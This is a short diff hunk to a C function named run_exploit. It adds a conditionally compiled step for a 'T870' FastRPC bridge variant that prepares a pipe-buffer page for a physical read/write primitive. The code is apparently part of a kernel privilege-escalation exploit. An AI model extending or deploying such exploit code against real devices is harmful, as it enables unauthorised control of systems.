@@ -471,6 +471,21 @@ int run_exploit(int argc, char **argv) {
 #endif
 #endif
 
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(T870_FASTRPC_BRIDGE) && T870_FASTRPC_BRIDGE
+  /*
+   * The original route services this request from run_main_route_threads()
+   * while its detached pselect child executes try_cfi_stage().  T870 replaces
+   * only that pselect write with the FastRPC bridge, so prepare the original
+   * pipe-buffer page before detaching the bridge owner.
+   */
+  pipebuf_page_base = prepare_pipe_buffer_page();
+  pr_info("t870 original physrw pipe page=%016zx\n", pipebuf_page_base);
+  if (!is_direct_ptr(pipebuf_page_base)) {
+    return 1;
+  }
+#endif
+
   pin_to_core(CORE);
 #if !defined(APP_FOPS_REUSE_VERIFIED_PAGE) || \
     !APP_FOPS_REUSE_VERIFIED_PAGE
